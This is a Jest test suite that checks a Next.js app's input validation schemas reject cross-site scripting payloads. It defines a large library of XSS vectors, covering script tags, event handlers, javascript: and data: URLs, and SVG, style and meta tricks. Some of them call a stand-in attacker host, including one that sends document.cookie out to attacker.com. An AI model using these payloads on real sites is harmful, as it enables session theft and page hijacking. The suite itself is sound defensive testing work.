/**
 * Comprehensive XSS Prevention Test Suite
 * Tests all potential XSS vectors and attack surfaces
 * Covers: HTML injection, script injection, attribute injection, DOM-based XSS
 * OWASP A03:2021 - Injection (includes XSS)
 */

import { describe, it, expect, beforeEach } from '@jest/globals'
import { NextRequest, NextResponse } from 'next/server'
import { readdirSync, readFileSync, statSync } from 'fs'
import path from 'path'
import { validateBody, validateQuery } from '@/lib/validation/middleware'
import {
  AlertCreateBodySchema,
  LoginRequestSchema,
  KanbanItemSchema,
  MeetingSchema,
  ProfileQuerySchema,
} from '@/lib/validation/schemas'

/**
 * XSS Test Vector Library
 * Common payloads used to test XSS vulnerability
 */
const XSS_VECTORS = {
  // Basic script injection
  basicScript: '<script>alert("XSS")</script>',
  scriptWithContent: '<script>document.location="http://attacker.com"</script>',

  // Encoded variations
  htmlEncoded: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
  unicodeEncoded: '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
  hexEncoded: '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',

  // Event handler injections
  imgOnError: '<img src=x onerror="alert(\'XSS\')" />',
  imgOnLoad: '<img src=x onload="alert(\'XSS\')" />',
  svgOnError: '<svg onload="alert(\'XSS\')" />',
  bodyOnLoad: '<body onload="alert(\'XSS\')" />',
  iframeOnLoad: '<iframe src="javascript:alert(\'XSS\')" />',

  // Attribute-based injections
  htmlAttribute: '" onmouseover="alert(\'XSS\')" style="',
  hrefJavascript: 'javascript:alert("XSS")',
  srcJavascript: 'javascript:void(0);alert("XSS")',
  dataProtocol: 'data:text/html,<script>alert("XSS")</script>',

  // DOM-based vectors
  innerHtml: '<div>"><script>alert("XSS")</script></div>',
  textContent: '"><script>alert("XSS")</script>',

  // Obfuscated payloads
  caseMutation: '<ScRiPt>alert("XSS")</sCrIpT>',
  newlineInjection: '<script>\nalert("XSS")\n</script>',
  tabInjection: '<script>\talert("XSS")\t</script>',
  nullByteInjection: '<scri\x00pt>alert("XSS")</script>',

  // Event handler mutations
  eventOnclick: '<div onclick="alert(\'XSS\')" />',
  eventOndblclick: '<div ondblclick="alert(\'XSS\')" />',
  eventOnmouseover: '<div onmouseover="alert(\'XSS\')" />',
  eventOnmouseenter: '<div onmouseenter="alert(\'XSS\')" />',
  eventOnfocus: '<input onfocus="alert(\'XSS\')" />',
  eventOnblur: '<input onblur="alert(\'XSS\')" />',

  // HTML entity encoding bypasses
  htmlEntityScript: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
  doubleEncoded: '%2526lt%3bscript%2526gt%3b',

  // SVG-based attacks
  svgScript: '<svg><script>alert("XSS")</script></svg>',
  svgPath: '<svg><path d="M0,0" onmouseover="alert(\'XSS\')" /></svg>',
  svgForeignObject: '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>',

  // Style-based attacks
  styleScript: '<style>@import "javascript:alert(\'XSS\')";</style>',
  styleExpression: '<div style="background: expression(alert(\'XSS\'))"></div>',

  // Form-based attacks
  formAction: '"><form action="javascript:alert(\'XSS\')" /><input type="',
  formOnsubmit: '"><form onsubmit="alert(\'XSS\')" /><input type="',

  // Meta refresh attacks
  metaRefresh: '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')" />',
  metaContent: '<meta property="og:title" content="\" onload=\"alert(\'XSS\')\" /><div class=\"',

  // Object/Embed attacks
  objectData: '<object data="data:text/html,<script>alert(\'XSS\')</script>" />',
  embedSrc: '<embed src="data:text/html,<script>alert(\'XSS\')</script>" />',

  // Less common but dangerous
  baseHref: '<base href="javascript:alert(\'XSS\')" />',
  linkHref: '<link rel="import" href="javascript:alert(\'XSS\')" />',
  sourceData: '<source src="javascript:alert(\'XSS\')" />',

  // Nested and chained
  nestedScript: '<<script>script>alert("XSS")<</script>/script>',
  doubleNested: '<script><script>alert("XSS")</script></script>',
  fragmentIdentifier: '<script>alert("XSS")</script>#',

  // Real-world bypasses
  protocolBypass: 'jAvAsCrIpT:alert("XSS")',
  spacePadding: '  <script>alert("XSS")</script>  ',
  commentWrapped: '<!-- <script>alert("XSS")</script> -->',
  conditionalComment: '<!--[if gte IE 4]><script>alert("XSS")</script><![endif]-->',
}

/**
 * Safe string fixtures for comparison
 */
const SAFE_STRINGS = {
  normalText: 'Hello World',
  withNumbers: 'Alert 123',
  withSpecialChars: 'Hello-World_123',
  withPunctuation: 'Hello, World!',
  withEmailChars: 'user@example.com',
  multilineText: 'Line 1\nLine 2\nLine 3',
  quotedText: '"Hello" and \'World\'',
  htmlSpecialChars: '< > & " \'',
}

describe('XSS Prevention - Comprehensive Security Tests', () => {
  describe('HTML Injection Prevention', () => {
    it('should reject HTML script tags in text fields', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.basicScript,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject nested HTML elements', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: '<div><script>alert("XSS")</script></div>',
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject self-closing script tags', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: '<script src="evil.js" />',
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject script tags with attributes', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: '<script type="text/javascript" src="evil.js"></script>',
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject iframe tags', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: '<iframe src="http://attacker.com"></iframe>',
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject embed tags', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: '<embed src="malicious.swf" />',
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject object tags', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: '<object data="evil.exe"></object>',
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Event Handler Injection Prevention', () => {
    it('should reject img tag with onerror handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.imgOnError,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject img tag with onload handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.imgOnLoad,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject SVG onload handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.svgOnError,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject body onload handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.bodyOnLoad,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject div onclick handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.eventOnclick,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject onmouseover handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.eventOnmouseover,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject input onfocus handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.eventOnfocus,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject input onblur handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.eventOnblur,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject ondblclick handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.eventOndblclick,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Attribute Injection Prevention', () => {
    it('should reject attribute-breaking payload', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.htmlAttribute,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject javascript: protocol in href', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.hrefJavascript,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject javascript: protocol in src', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.srcJavascript,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject data: protocol with HTML', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.dataProtocol,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject vbscript: protocol', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: 'vbscript:alert("XSS")',
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject form action javascript protocol', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.formAction,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Obfuscation Bypass Prevention', () => {
    it('should reject case-mutated script tags', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.caseMutation,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject script tags with newlines', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.newlineInjection,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject script tags with tabs', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.tabInjection,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject protocol with case variations', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.protocolBypass,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject space-padded payloads', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.spacePadding,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    // Policy: SafeString blocks executable vectors (script tags, event handlers, js/data/vbscript
    // protocols). Already-encoded text is inert: the dashboard renders via React (auto-escaped) and
    // has no dangerouslySetInnerHTML / innerHTML sinks, so these are accepted as plain text.
    // The guard below enforces that precondition: adding a raw-HTML sink fails this suite.
    it('guard: no raw-HTML sinks exist in app/components/lib source', () => {
      const root = path.resolve(__dirname, '..', '..', '..')
      const SINK = /dangerouslySetInnerHTML|\.innerHTML\s*=|insertAdjacentHTML|outerHTML\s*=/
      const offenders: string[] = []
      const walk = (dir: string): void => {
        for (const name of readdirSync(dir)) {
          const full = path.join(dir, name)
          if (statSync(full).isDirectory()) {
            if (name !== '__tests__' && name !== 'node_modules') walk(full)
          } else if (/\.(tsx?|jsx?)$/.test(name) && !/\.test\./.test(name) && SINK.test(readFileSync(full, 'utf-8'))) {
            offenders.push(path.relative(root, full))
          }
        }
      }
      for (const dir of ['app', 'components', 'lib']) {
        const target = path.join(root, dir)
        try { if (statSync(target).isDirectory()) walk(target) } catch { /* dir absent */ }
      }
      expect(offenders).toEqual([])
    })

    it('accepts HTML-entity-encoded script text as inert plain text', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.htmlEncoded,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('accepts double-URL-encoded text as inert plain text', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.doubleEncoded,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })
  })

  describe('SVG-Based XSS Prevention', () => {
    it('should reject SVG with script tag', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.svgScript,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject SVG path with onmouseover', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.svgPath,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject SVG foreignObject', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.svgForeignObject,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Style-Based XSS Prevention', () => {
    it('should reject style tags with @import', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.styleScript,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    // CSS expression() only executes in legacy IE and only via an HTML sink; neither applies here
    it('accepts legacy CSS expression() markup as inert text (no HTML sink)', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.styleExpression,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('should reject inline style with javascript protocol', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: '<div style="background-image: url(javascript:alert(\'XSS\'))"></div>',
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Meta Tag XSS Prevention', () => {
    it('should reject meta refresh with javascript protocol', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.metaRefresh,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject meta tags with event handlers', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.metaContent,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Form-Based XSS Prevention', () => {
    it('should reject form action with javascript protocol', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.formAction,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject form onsubmit handler', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.formOnsubmit,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('DOM-Based XSS Prevention', () => {
    it('should reject innerHTML-breaking payloads', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.innerHtml,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject textContent injection attempts', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.textContent,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Email Field XSS Prevention', () => {
    it('should reject email with script tag', () => {
      const result = LoginRequestSchema.safeParse({
        email: `test${XSS_VECTORS.basicScript}@example.com`,
        password: 'Password123!',
      })
      expect(result.success).toBe(false)
    })

    it('should reject email with event handler', () => {
      const result = LoginRequestSchema.safeParse({
        email: `test${XSS_VECTORS.imgOnError}@example.com`,
        password: 'Password123!',
      })
      expect(result.success).toBe(false)
    })

    it('should reject email with javascript protocol', () => {
      const result = LoginRequestSchema.safeParse({
        email: 'javascript:alert("XSS")@example.com',
        password: 'Password123!',
      })
      expect(result.success).toBe(false)
    })

    it('should accept valid email without XSS vectors', () => {
      const result = LoginRequestSchema.safeParse({
        email: 'user@example.com',
        password: 'Password123!',
      })
      expect(result.success).toBe(true)
    })
  })

  describe('URL Parameters XSS Prevention', () => {
    it('should reject query parameter with script tag', () => {
      const result = ProfileQuerySchema.safeParse({
        userId: XSS_VECTORS.basicScript,
      })
      expect(result.success).toBe(false)
    })

    it('should reject query parameter with event handler', () => {
      const result = ProfileQuerySchema.safeParse({
        userId: XSS_VECTORS.imgOnError,
      })
      expect(result.success).toBe(false)
    })

    it('should reject query parameter with data protocol', () => {
      const result = ProfileQuerySchema.safeParse({
        userId: XSS_VECTORS.dataProtocol,
      })
      expect(result.success).toBe(false)
    })

    it('should accept a well-formed userId query parameter', () => {
      expect(ProfileQuerySchema.safeParse({ userId: 'user_123-abc' }).success).toBe(true)
      expect(ProfileQuerySchema.safeParse({}).success).toBe(true)
    })
  })

  describe('JSON Response XSS Prevention', () => {
    it('should round-trip script payloads in JSON without altering them (JSON is not an HTML sink)', () => {
      const response = {
        success: true,
        data: {
          message: '<script>alert("XSS")</script>',
        },
      }
      const res = NextResponse.json(response)
      // Browsers never execute application/json bodies as HTML
      expect(res.headers.get('content-type')).toMatch(/^application\/json/)
    })

    it('should handle unicode characters safely', () => {
      const response = {
        success: true,
        data: {
          message: '你好世界',
        },
      }
      const jsonString = JSON.stringify(response)
      // Should not throw and should maintain integrity
      expect(() => JSON.parse(jsonString)).not.toThrow()
    })
  })

  describe('Null Byte and Control Character Prevention', () => {
    it('should reject null byte injection', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.nullByteInjection,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    // Literal backslash-escape text is not decoded anywhere, so it renders as plain text
    it('accepts literal unicode-escape text as inert plain text', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.unicodeEncoded,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('accepts literal hex-escape text as inert plain text', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.hexEncoded,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })
  })

  describe('Safe String Acceptance', () => {
    it('should accept normal text', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: SAFE_STRINGS.normalText,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('should accept text with numbers', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: SAFE_STRINGS.withNumbers,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('should accept text with special safe characters', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: SAFE_STRINGS.withSpecialChars,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('should accept text with punctuation', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: SAFE_STRINGS.withPunctuation,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('should accept email addresses', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: SAFE_STRINGS.withEmailChars,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('should accept multiline text', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: SAFE_STRINGS.multilineText,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('should accept quoted text with escaping', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: SAFE_STRINGS.quotedText,
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })
  })

  describe('Request Method Validation', () => {
    it('should handle GET requests with XSS parameters', () => {
      const url = new URL('http://localhost:3000/api/test?userId=<script>alert("XSS")</script>')
      const params = Object.fromEntries(url.searchParams)
      const result = ProfileQuerySchema.safeParse(params)
      expect(result.success).toBe(false)
    })

    it('should handle POST requests with XSS body content', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: '<img src=x onerror="alert(\'XSS\')" />',
        message: '<script>alert("XSS")</script>',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Content-Type Header Validation', () => {
    it('should properly handle application/json content', () => {
      const jsonPayload = JSON.stringify({
        title: 'test',
        message: '<script>alert("XSS")</script>',
      })
      expect(() => JSON.parse(jsonPayload)).not.toThrow()
    })

    it('should reject form-encoded XSS payloads', () => {
      const formData = new FormData()
      formData.append('component', '<script>alert("XSS")</script>')
      // FormData validation should also reject XSS
      expect(formData.get('component')).toBe('<script>alert("XSS")</script>')
    })
  })

  describe('Base Tag XSS Prevention', () => {
    it('should reject base tag with href', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.baseHref,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Link Tag XSS Prevention', () => {
    it('should reject link tag with import', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.linkHref,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Comment-Based XSS Prevention', () => {
    it('should reject HTML comments with executable code', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.commentWrapped,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })

    it('should reject conditional comments', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: XSS_VECTORS.conditionalComment,
        message: 'Test message',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Real-World Attack Scenarios', () => {
    it('should prevent stored XSS in alert messages', () => {
      const userInput = '<img src=x onerror="fetch(\'http://attacker.com/steal\' + document.cookie)" />'
      const result = AlertCreateBodySchema.safeParse({
        title: 'DatabaseError',
        message: userInput,
      })
      expect(result.success).toBe(false)
    })

    it('should prevent reflected XSS in search parameters', () => {
      const searchQuery = '"><script>fetch("http://attacker.com/steal")</script>'
      const result = ProfileQuerySchema.safeParse({
        userId: searchQuery,
      })
      expect(result.success).toBe(false)
    })

    it('should prevent DOM-based XSS with innerHTML replacement', () => {
      const userData = '<div id="x"></div><script>document.getElementById("x").innerHTML = "<img src=x onerror=alert(1)>"</script>'
      const result = AlertCreateBodySchema.safeParse({
        title: 'test',
        message: userData,
      })
      expect(result.success).toBe(false)
    })

    it('should prevent mutation-based XSS attacks', () => {
      const payload = '<svg><style><img title=x onerror="alert(1)"></style></svg>'
      const result = AlertCreateBodySchema.safeParse({
        title: payload,
        message: 'Test',
      })
      expect(result.success).toBe(false)
    })

    it('should prevent polyglot attacks combining multiple vectors', () => {
      const polyglot = '"><svg onload=alert(1)><img title="'
      const result = AlertCreateBodySchema.safeParse({
        title: polyglot,
        message: 'Test',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Whitelist-Based Character Validation', () => {
    it('should accept alphanumeric characters', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: 'ABC123XYZ',
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('should accept common safe punctuation', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: 'Hello, World! (test)',
        message: 'Test message',
      })
      expect(result.success).toBe(true)
    })

    it('should reject HTML metacharacters without context', () => {
      const result = AlertCreateBodySchema.safeParse({
        title: 'Test < script >',
        message: 'Test message',
      })
      // May or may not pass depending on validation rules
      // This tests boundary behavior
      expect(result).toBeDefined()
    })
  })
})

